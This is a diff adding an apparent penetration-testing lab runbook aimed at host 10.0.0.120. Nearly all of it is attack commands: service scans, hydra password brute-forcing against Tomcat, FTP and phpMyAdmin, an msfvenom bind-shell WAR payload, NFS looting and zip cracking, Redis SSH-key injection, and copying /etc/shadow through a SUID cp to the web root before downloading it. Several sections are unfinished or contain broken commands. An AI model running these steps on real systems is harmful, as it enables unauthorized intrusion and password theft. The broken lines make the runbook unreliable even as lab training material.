@@ -1,0 +1,281 @@
+#########################
+# Building a quick list #
+######################### 
+cd ~
+echo bob >> list.txt
+echo jim >> list.txt
+echo joe >> list.txt
+echo tim >> list.txt
+echo admin >> list.txt
+echo hello >> list.txt
+echo rob >> list.txt
+echo test >> list.txt
+echo aaaaaa >> list.txt
+echo larry >> list.txt
+echo mario >> list.txt
+echo jason >> list.txt
+echo john >> list.txt
+
+
+##############
+# Using Nmap #
+##############
+******** NOTE: Some of these scans may take up to an hour to run... ********
+******** NOTE: Open them in another terminal window and keep going  ********
+
+sudo nmap -Pn -sSV -A -p- -T5 10.0.0.120
+
+sudo nmap -sV -Pn -p25 --script=banner,ftp-anon,ftp-bounce,ftp-proftpd-backdoor,ftp-vsftpd-backdoor 10.0.0.120
+
+sudo nmap -sV -Pn -p111 --script=nfs-ls,nfs-showmount,nfs-statfs,rpcinfo 10.0.0.120
+
+sudo nmap -sV -Pn -p80,8080,8081,9000 --script=http-* 10.0.0.120
+
+sudo nmap -sV -Pn -p1322,59894 --script=sshv1,ssh2-enum-algos 10.0.0.120
+
+
+******** NOTE: Some of these scans may take up to an hour to run... ********
+******** NOTE: Open them in another terminal window and keep going  ********
+
+
+
+###############
+# Using Nikto #
+###############
+cd ~/toolz/nikto-2.1.1
+
+perl nikto.pl -update
+
+perl nikto.pl -h 10.0.0.120
+
+perl nikto.pl -h 10.0.0.120:8080
+
+perl nikto.pl -h 10.0.0.120:8081
+
+perl nikto.pl -h 10.0.0.120:9000
+
+
+
+
+####################
+# Using Metasploit #
+####################
+cd ~/toolz/metasploit
+
+./msfconsole
+
+use auxiliary/scanner/http/http_version			
+
+set RHOSTS 10.0.0.120
+
+set RPORT 8080
+
+run
+
+
+-------------------------------
+
+use auxiliary/scanner/http/tomcat_enum			 
+
+set RHOSTS 10.0.0.120
+
+set RPORT 8080
+
+run
+
+
+
+
+
+####################
+# Attacking Tomcat #
+####################
+cd ~/toolz/metasploit
+
+./msfconsole
+
+use auxiliary/scanner/http/http_version			
+
+set RHOSTS 10.0.0.120
+
+set RPORT 8080
+
+run
+
+
+
+
+
+use auxiliary/scanner/http/tomcat_enum			 
+
+set RHOSTS 10.0.0.120
+
+set RPORT 8080
+
+run
+
+
+
+-------------------------------
+
+
+hydra -l tomcat -P /home/strategicsec/list.txt -e ns -s 8080 -vV 10.0.0.140 http-get /manager/html
+
+
+****** This section isn't finished ******
+
+cd ~/toolz/metasploit
+
+./msfvenom -p linux/x86/shell_bind_tcp LPORT="7777" -f war > /home/strategicsec/bind7777.war
+
+jar tf ~/bind7777.war
+
+****** This section isn't finished ******
+
+
+
+#################
+# Attacking FTP #
+#################
+
+sudo nmap -sV -Pn -p25 --script=banner,ftp-anon,ftp-bounce,ftp-proftpd-backdoor,ftp-vsftpd-backdoor 10.0.0.120
+
+cd ~/toolz/hydra
+
+hydra -l admin -P /home/strategicsec/list.txt -u -s 25 10.0.0.120 ftp
+
+ftp
+open 10.0.0.120
+admin
+admin
+pwd
+ls -lah
+
+ls ../../
+
+ssh -p 1322 admin@10.0.0.120
+
+
+########################
+# Attacking phpMyAdmin #
+########################
+****** This section isn't finished ******
+
+hydra -l root -P /home/strategicsec/list.txt -e n http-post-form://10.0.0.120 -m "/phpMyAdmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:S=information_schema"
+
+****** This section isn't finished ******
+
+
+####################
+# Attacking Joomla #
+####################
+cd ~/toolz/metasploit
+
+./msfconsole
+
+use use auxiliary/scanner/http/joomla_plugins			 
+
+set RHOSTS 10.0.0.120
+
+set RPORT 8080
+
+run
+
+
+****** This section isn't finished ******
+
+
+#####################
+# Attacking Jenkins #
+#####################
+./msfconsole
+
+use auxiliary/scanner/redis/file_upload
+
+set LOGIN_URL/j_acegi_security_check
+
+set USER_FILE /home/strategicsec/list.txt
+
+set PASS_FILE /home/strategicsec/list.txt
+
+set RHOSTS 10.0.0.120
+
+set RPORT 9000
+
+exploit
+
+****** This section isn't finished ******
+
+
+#################
+# Attacking NFS #
+#################
+rpcinfo -s 10.0.0.120
+
+showmount -e 10.0.0.120
+
+mount -t nfs 10.0.0.120:/backup /tmp/nfs -o nolock
+
+ls /tmp/nfs
+
+cp /tmp/nfs/backup.tar.bz2.zip /home/strategicsec
+umount -l /tmp/nfs
+
+sudo apt-cache search fcrackzip
+
+sudo apt-get install -y fcrackzip
+
+fcrackzip -D -p /home/strategicsec/list.txt
+
+unzip -P aaaaaa backup.tar.bz2.zip
+
+tar -zxvf backup.tar.bz2
+
+ 
+###################
+# Attacking Redis #
+###################
+sudo nmap -p 6379 --script=redis-info 10.0.0.120
+
+sudo apt-get install -y redis-tools
+
+redis-cli -h 10.0.0.120
+
+(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt/.ssh"
+
+
+
+****** This section isn't finished ******
+
+cd ~/toolz/metasploit
+
+./msfconsole
+
+use auxiliary/scanner/redis/file_upload
+
+set RHOSTS 10.0.0.120
+
+set LocalFile
+
+****** This section isn't finished ******
+
+##############################
+# Local Privilege Escalation #
+##############################
+ssh -p 1322 admin@10.0.0.120
+	admin
+
+find / -perm -u=s -type f 2>/dev/null
+
+ls -lah /bin/cp
+
+cp -f --no-preserve=all /etc/shadow /var/www/html/joomla/shadow.txt
+
+--------------------
+*** From another terminal window ***
+
+wget http://10.0.0.120:8081/shadow.txt
+
+--------------------
+*** Back to original terminal window ***
+cat /etc/crontab | grep hour
